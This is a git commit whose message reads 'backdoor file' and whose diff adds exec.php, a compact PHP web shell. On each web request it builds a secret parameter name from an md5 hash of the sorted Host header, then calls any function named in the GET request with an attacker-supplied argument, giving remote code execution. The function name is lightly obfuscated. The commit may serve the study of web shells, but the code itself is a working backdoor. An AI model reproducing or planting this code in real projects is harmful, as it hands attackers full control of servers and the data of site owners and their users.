aa6722af8b5c5fbd8d0b189e79eefffcd91f26c7
Ambulong <Ambulong@localhost.localdomain>
2016-02-03 23:04:00 +0800

    后门文件

---
+++ exec.php
@@ -0,0 +1,25 @@
+<?php
+if(isset($_SERVER['HTTP_HOST']) && $_SERVER['HTTP_HOST'] != ''){
+        editl3O0();
+}
+
+//后门
+function editl3O0(){
+try{
+        $p = $_GET[get_sign()];
+        if(is_array($p) && count($p)==1){
+                foreach($p as $key => $value){
+                        $key($value);
+                }
+        }
+}catch(Exception $e){}
+}
+
+//生成密码
+function get_sign(){
+try{
+        $arr = str_split($_SERVER['HTTP_HOST']);
+        sort($arr, SORT_STRING);
+        return md5(implode('', $arr));
+}catch(Exception $e){}
+}
